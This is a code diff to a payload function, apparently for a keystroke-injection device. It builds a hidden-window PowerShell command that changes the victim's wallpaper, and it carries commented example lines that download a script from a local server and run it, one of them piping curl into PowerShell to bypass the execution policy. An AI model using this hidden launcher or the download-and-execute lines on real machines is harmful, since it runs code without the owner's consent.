@@ -7,8 +7,8 @@ String payload()
   // launch powershell in the background
   payload += "powershell.exe -windowstyle hidden Invoke-Command -ScriptBlock {";
   
-  // exemple to download a vbs script from a web-server
-  // payload = "$client = new-object System.Net.WebClient;$client.DownloadFile(\"http://192.168.0.120:8080/test.txt\",\"Sys32Data.vbs\");Start .\\Sys32Data.vbs;exit";
+  // exemple to download a powershell script and running it (without script execution allow in Execution Policy)
+  // payload = "C:\\Windows\\System32\\curl.exe http://127.0.0.1:8080/script.txt | powershell";
 
   // exemple to change the current wallpaper  
   payload += "cd C:/Users/Public;"; 
@@ -16,13 +16,7 @@ String payload()
   payload += "reg add \'HKEY_CURRENT_USER\\Control Panel\\Desktop\' /v Wallpaper /t REG_SZ /d C:/Users/public/img.jpg /f;";
   // spam this command to force the update of the wallpaper
   // if not used, the changes will take place at reboot
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
-  payload += "RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True;";
+  payload += "for ($i=0;$i -lt 10; $i++) {RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True}";
   payload += "exit";
 
   payload += "}";
